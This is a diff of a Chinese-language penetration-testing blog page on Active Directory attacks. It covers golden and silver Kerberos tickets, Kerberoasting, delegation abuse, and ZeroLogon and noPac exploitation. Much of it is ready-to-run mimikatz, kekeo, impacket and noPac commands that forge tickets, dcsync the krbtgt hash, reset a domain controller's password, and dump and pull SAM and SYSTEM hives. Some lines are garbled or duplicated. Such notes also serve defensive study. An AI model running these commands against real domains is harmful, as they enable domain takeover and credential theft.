+<h2 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h2><p>在域上抓取的哈希</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentest.com /user:krbtgt</span><br><span class="line"></span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值</span><br><span class="line"></span><br><span class="line">/ticket:adinistrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85606">域服务账号破解实践</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos的认证原理</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cxzhq2002/article/details/80938770">深刻理解windows安全认证机制ntlm＆Kerberos</a></p>
-<h1 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">黄金票据和白银票据的一些区别： Golden Ticket：伪造 TGT ，可以获取 任何Kerberos 服务权限 银票：</span><br><span class="line"></span><br><span class="line">伪造TGS， 只能访问指定的服务 加密方式不同： Golden Ticket由 krbtgt 的hash加密 Silver Ticket由 服</span><br><span class="line"></span><br><span class="line">务账号 （通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用</span><br><span class="line"></span><br><span class="line">的过程不需要同域控通信 相关阅读 :</span><br></pre></td></tr></table></figure>
+<p>原理：</p>
+<p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个<br>Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改</p>
+<h3 id="伪造金票的场景和所需条件"><a href="#伪造金票的场景和所需条件" class="headerlink" title="伪造金票的场景和所需条件"></a>伪造金票的场景和所需条件</h3><p>黄金票据的利用常用于权限维持阶段。假设这么一种情况，我们已拿到的域内所有的账户Hash，包括krbtgt账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置krbtgt密码，基于此条件，我们还能利用该票据重新获得域管理员权限，利用krbtgt的HASH值可以伪造生成任意的TGT(<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=mimikatz&spm=1001.2101.3001.7020">mimikatz</a>)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
+<h3 id="所需条件："><a href="#所需条件：" class="headerlink" title="所需条件："></a>所需条件：</h3><p>1、域名称</p>
+<p>2、域的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SID&spm=1001.2101.3001.7020">SID</a>值</p>
+<p>3、域的KRBTGT账号的HASH</p>
+<p>4、伪造任意用户名</p>
+<p>（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）</p>
+<p>1.黄金票据：即伪造的TGT<br>2.白银票据：即伪造的ST</p>
+<h2 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">黄金票据和白银票据的一些区别： Golden Ticket：伪造 TGT ，可以获取 任何Kerberos 服务权限 银票：</span><br><span class="line"></span><br><span class="line">伪造TGS， 只能访问指定的服务 加密方式不同： Golden Ticket由 krbtgt 的hash加密 Silver Ticket由 服</span><br><span class="line"></span><br><span class="line">务账号 （通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用</span><br><span class="line"></span><br><span class="line">的过程不需要同域控通信 相关阅读 :</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">攻击者如何使用</a>Kerberos的银票来利用系统</p>
 <p><a target="_blank" rel="noopener" href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf">域渗透——Pass The Ticket</a></p>
-<h1 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a><strong>域服务账号破解</strong></h1><p>与上面SPN扫描类似的原理 <a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> 获取所有用作SPN的帐户</p>
+<h2 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a><strong>域服务账号破解</strong></h2><p>与上面SPN扫描类似的原理 <a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> 获取所有用作SPN的帐户</p>
 <p><code>setspn -T PENTEST.com -Q */*</code></p>
 <p>从Mimikatz的RAM中提取获得的门票</p>
 <p><code>kerberos::list /export</code></p>
@@ -1006,8 +1062,7 @@
 <p><code>MYDOMAIN.LOCAL.kirbi</code></p>
 <p><strong>凭证盗窃</strong></p>
 <p>从搜集的密码里面找管理员的密码</p>
-<p><strong>NTLM relay</strong></p>
-<p><a target="_blank" rel="noopener" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></p>
+<h2 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a>NTLM relay</h2><p><a target="_blank" rel="noopener" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/privexchange/">privexchange</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/ridter/exchange2domain">Exchange2domain</a></p>
 <p>用于主动让目标机器发起NTLM请求的方法：</p>
@@ -1021,13 +1076,92 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/Ridter/Relayx">Relayx</a></p>
 <p>内网445端口转发：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/praetorian-inc/PortBender">PortBender</a></p>
-<h1 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h1><p><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></p>
+<h2 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h2><p>假设用户A在使用主机hostB上的服务B，这时候用户A使用了服务B的一个功能，这个功能需要让主机hostB上的服务B访问主机HostC上的服务C中专属于用户A的部分才能完成，这时候主机hostB上的服务B就需要代表用户A去访问hostC上的服务C。这整个过程就是委派。</p>
+<p>简而言之，上述过程就是用户A委派主机hostB上的服务代表自己去访问了主机hostC上的服务C，委派需要提前在域控上进行配置，它可以理解成是一种权限。</p>
+<p>KDC可以确定A是否有访问服务B的权限，这时候就得有一个方法来让KDC知道A允许B代表自己来“做事情”，这句话可能有点绕，可以多看几遍。这时候S4U2SELF与S4U2PROXY这两个东西就出现了。这两种协议在非约束性委派的机器上不会使用，只会影响约束性与基于资源的约束性这两种委派方式</p>
+<p>三种委派:</p>
+<p>非约束性委派</p>
+<p>约束性委派</p>
+<p>基于资源的约束性委派</p>
+<p>KDC可以确定A是否有访问服务B的权限，这时候就得有一个方法来让KDC知道A允许B代表自己来“做事情”，这句话可能有点绕，可以多看几遍。这时候S4U2SELF与S4U2PROXY这两个东西就出现了。这两种协议在非约束性委派的机器上不会使用，只会影响约束性与基于资源的约束性这两种委派方式</p>
+<h3 id="S4U2SELF56"><a href="#S4U2SELF56" class="headerlink" title="S4U2SELF56"></a>S4U2SELF56</h3><p>S4U2SELF的作用是使得服务可以代表某个用户获得一个用来访问服务自身的票据。</p>
+<p>这个东西在TGS_REQ这个阶段中，S4U2SELF是这个数据包的一部分内容。<br>S4U2SELF一般是一个值，例如Administrator等。当配置了这个值并且服务器B获得了可转发的TICKET票据后，服务器B就可以代表Administrator进行操作。配置这个值可以自己配置，那么获得可转发的TICKET票据有什么条件呢？<br>1.一个可转发的服务器B的TGT。<br>2.当前服务器B配置了约束委派<br>3.服务B在TGS_REQ阶段设置了forwardable选项</p>
+<p>这些都能自己设置，那岂不是可以伪造任意用户对当前服务B进行操作了？其实不是的，倘若目标用户被设置成敏感账户，不能被委派，则TICKET的FLAG字段肯定没有forwardable，也就是说条件3是无法满足的，于是不能伪装成此用户。</p>
+<h3 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h3><p>S4U2PROXY也是在TGS_REQ阶段的一个参数。<br>S4U2PROXY可以使当前主机代表其他用户来访问其他主机，相比较于S4U2SELF，范围大了很多，当然“代表”肯定也是有限制条件的。</p>
+<p>要想使用S4U2PROXY必须得经过S4U2SELF阶段，需要获得那个可转发的TICKET,这个TICEKT会放在TGS_REQ中的additionTicket中。</p>
+<p>假设当前主机为b，接受了administrator的委派。主机B将这个TGS_REQ请求发送给KDC并获得访问其他主机例如主机C的权限。<br>上面这些是大概流程，具体需要达成的条件为：<br>1.S4U2SELF阶段生成的可转发的TICKET<br>2.在TGS_REQ阶段设置CNAME-IN-ADDL-TKT标志<br>3.在TGS_REQ阶段设置forwardable标志<br>4.如果服务1 有到服务2的非约束委派，将服务2的SPN放在sname里面。<br>S4U2proxy 必须扩展PAFORUSER结构。</p>
+<h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><p>如果admin委派服务器B来代替自己访问其他服务，则admin会先将自己的TGT发送给服务器B存储在lsass中。<code>非约束性委派不会走S4U2Self和S4U2proxy这两个协议。</code></p>
+<p>现在假设这么一种情形，service1配置了非约束性委派，用户A需要委派service1来访问service2。这个service1可以是主机账户。</p>
+<p>那么非约束性委派的过程可以大概理解为：</p>
+<p>用户A向KDC申请一张可转发的用户A自己的TGT与访问service1需要的ticket。<br>用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1.<br>service1使用那张tgt与session key来代表用户A行使后续操作例如访问service2.</p>
+<h3 id="查找域内非约束委派用户和计算机"><a href="#查找域内非约束委派用户和计算机" class="headerlink" title="查找域内非约束委派用户和计算机"></a><strong>查找域内非约束委派用户和计算机</strong></h3><p>Adfind 下载地址：<a target="_blank" rel="noopener" href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Adfind 使用参数：</span><br><span class="line">AdFind [switches] [-b basedn] [-f filter] [attr list]</span><br><span class="line">-b：指定要查询的根节点</span><br><span class="line">-f：LDAP过滤条件</span><br><span class="line">attr list：需要显示的属性</span><br><span class="line"></span><br><span class="line">例如需要查询当前域内的非约束委派用户：</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查找非约束委派用户的工具还有很多！例如 Adfind、ldapdomaindump、PowerView … 等等，</p>
+<h3 id="非约束委派攻击利用"><a href="#非约束委派攻击利用" class="headerlink" title="非约束委派攻击利用"></a>非约束委派攻击利用</h3><p>非约束委派：当 <code>user</code> 访问 <code>service1</code> 时，如果 <code>service1</code> 的服务账号开启了 <code>unconstrained delegation</code>（非约束委派），则当 <code>user</code> 访问 <code>service1</code> 时会将 <code>user</code> 的 <code>TGT</code> 发送给 <code>service1</code> 并保存在内存中以备下次重用，然后 <code>service1</code> 就可以利用这张<code>TGT</code> 以 <code>user</code>的身份去访问域内的任何服务（任何服务是指<code>user</code>能访问的服务） 流程如下:</p>
+<ol>
+<li>用户向KDC请求可转发TGT，记为TGT1</li>
+<li>KDC返回TGT1</li>
+<li>用户通过TGT1向KDC请求转发TGT2</li>
+<li>KDC返回TGT2</li>
+<li>用户通过TGT1向KDC申请访问服务1的RST</li>
+<li>KDC返回RST</li>
+<li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li>
+<li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li>
+<li>KDC给服务1返回服务2的RST</li>
+<li>服务1以用户名义向服务2发出请求</li>
+<li>服务2响应服务1的请求</li>
+<li>服务1响应用户第7步骤的请求</li>
+</ol>
+<p>这个流程有一个问题：<code>TGT2</code>是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。攻击其实就是利用的这点，使用从高权限账户处得到的<code>TGT</code>去获取权限。</p>
+<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>只能模仿特定用户</p>
+<p>1、使用 Adfind <strong>查询约束委派的用户</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.10.10.8 -u redteam-iis -up Server12345 -b <span class="string">&quot;DC=redteam,DC=red&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p>2.利用 kekeo 请求该用户的 TGT：<code>TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe </span><br><span class="line">tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 /ticket:administrator.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用 kekeo 请求该用户的 TGT 命令解释： tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi /user: 服务用户的用户名 /password: 服务用户的明文密码 /domain: 所在域名 /ticket: 指定票据名称，不过这个参数没有生效，可以忽略 得到服务用户 TGT：TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi 使用这张 TGT 通过伪造 s4u 请求以 administrator 用户身份请求访问 AD-2008 CIFS的 ST tgs::s4u /tgt:TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/AD-2008.redteam.red S4U2Self 获取到的 ST1 以及 S4U2Proxy 获取到的 AD-2008 CIFS 服务的 ST2 会保存在当前目录下</span><br></pre></td></tr></table></figure>
+
+<p>使用这张 TGT (<code>TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code>) 获取域机器的 ST：<code>TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD-2008.redteam.red@REDTEAM.RED.kirbi</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/AD-2008.redteam.red</span><br></pre></td></tr></table></figure>
+
+<p>4、使用 mimikatz 将 ST2 导入当前会话即可，如果有杀软，自行免杀，运行 mimikatz 进行 ptt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD-2008.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">s4u2pwnage</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></p>
 <p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=4056">用打印服务获取域控</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">Computer Takeover</a></p>
 <p><a target="_blank" rel="noopener" href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relaying and Kerberos delegation</a></p>
 <p><a target="_blank" rel="noopener" href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">CVE-2019-1040</a></p>
+<h2 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h2><p>实在搞不定再搞ARP</p>
+<h2 id="zerologon漏洞"><a href="#zerologon漏洞" class="headerlink" title="zerologon漏洞"></a>zerologon漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;</span><br><span class="line"></span><br><span class="line">secretsdump.py &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;\<span class="variable">$@</span>&lt;IP&gt; -no-pass -just-dc-user</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;Administrator&quot;</span></span><br><span class="line"></span><br><span class="line">secretsdump.py -hashes :&lt;HASH_admin&gt; &lt;DOMAIN&gt;/Administrator@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line">python3 restorepassword.py -target-ip &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">&lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;@&lt;MACHINE_BIOS_NAME&gt; -hexpass &lt;HEXPASS&gt;</span><br></pre></td></tr></table></figure>
+
+<p>CVE-2020-1472的分析与复现 (0range-x.github.io)</p>
+<h3 id="利用Mimikatz-check"><a href="#利用Mimikatz-check" class="headerlink" title="利用Mimikatz check"></a>利用Mimikatz check</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:dc1.exploit.local /account:dc1$</span><br></pre></td></tr></table></figure>
+
+<p><strong>exploit</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit</span><br></pre></td></tr></table></figure>
+
+<p><strong>dcsync</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local</span><br><span class="line"></span><br><span class="line">/authpassword:<span class="string">&quot;&quot;</span> /domain:exploit.local /authntlm /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><strong>restore</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon /target:conttosson.locl /account:dc$</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用impacket</strong></p>
+<p><code>取目标主机名+IP</code></p>
+<p><code>install 修改版本的impacket</code></p>
+<p><code>Exp</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py DC2008 10.211.55.200</span><br><span class="line"></span><br><span class="line">secretsdump.py -no-pass cgdomain.com/<span class="string">&#x27;DC2008$&#x27;</span>@10.211.55.200 -<span class="built_in">history</span> -just-dcuser administrator</span><br><span class="line">secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae</span><br><span class="line"></span><br><span class="line">获取到旧的密码明文hex，还原</span><br><span class="line"></span><br><span class="line">python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -</span><br><span class="line">hexpass</span><br><span class="line">59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123</span><br><span class="line">d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a</span><br><span class="line">04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d</span><br><span class="line">82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b66</span><br><span class="line">87a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097</span><br><span class="line">ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b</span><br><span class="line"></span><br><span class="line">恢复方法2</span><br><span class="line">通过wmic, pass the <span class="built_in">hash</span> 拿到域控制器中的本地管理员权限(域管)</span><br><span class="line">wmiexec.py -hashes</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e</span><br><span class="line">test.local/Administrator@10.211.55.38</span><br><span class="line"></span><br><span class="line">然后分别执行,拷贝本机中SAM数据库到本地</span><br><span class="line"></span><br><span class="line">- reg save HKLM\SYSTEM system.save</span><br><span class="line">- reg save HKLM\SAM sam.save</span><br><span class="line">- reg save HKLM\SECURITY security.save</span><br><span class="line">- get system.save</span><br><span class="line">- get sam.save</span><br><span class="line">- get security.save</span><br><span class="line">- del /f system.save</span><br><span class="line">- del /f sam.save</span><br><span class="line">- del /f security.save</span><br><span class="line">提取明文<span class="built_in">hash</span></span><br><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br><span class="line">然后恢复。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>CVE-2021-42278 &amp;&amp; CVE-2021-42287</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/safebuffer/sam-the-admin">safebuffer&#x2F;sam-the-admin: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">cube0x0&#x2F;noPac: CVE-2021-42287&#x2F;CVE-2021-42278 Scanner &amp; Exploiter. (github.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./noPac.exe -domain dc.com -user username -pass &#x27;password&#x27; /dc owa.dc.com</span><br><span class="line"></span><br><span class="line">/mAccount mAusername /mPassword password /service cifs /ptt</span><br></pre></td></tr></table></figure>
+
 
                 
                 <p class="end">__END__</p>
